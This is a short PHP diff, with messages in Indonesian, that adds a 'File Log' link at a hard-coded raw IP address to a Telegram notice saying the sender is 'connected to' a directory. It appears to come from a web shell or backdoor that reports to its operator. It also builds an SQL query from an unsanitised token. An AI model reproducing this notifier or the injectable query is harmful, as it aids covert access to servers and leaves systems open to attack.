@@ -22,6 +22,7 @@ $exec = mysqli_query($conn, "select * from tokens where token = '$token'");
 $parse_data = mysqli_fetch_assoc($exec);
 $id_token = $parse_data['id_telegram'];
 $pesan = "Anda telah terhubung ke: <b>".$dir."</b>
-Date: <i>".$tgl."</i>";
+Date: <i>".$tgl."</i>
+File Log: http://80.211.184.148/bagus/first_log.php?db=".$parse_data['init_log'];
 
 do_telegram($id_token, $pesan);
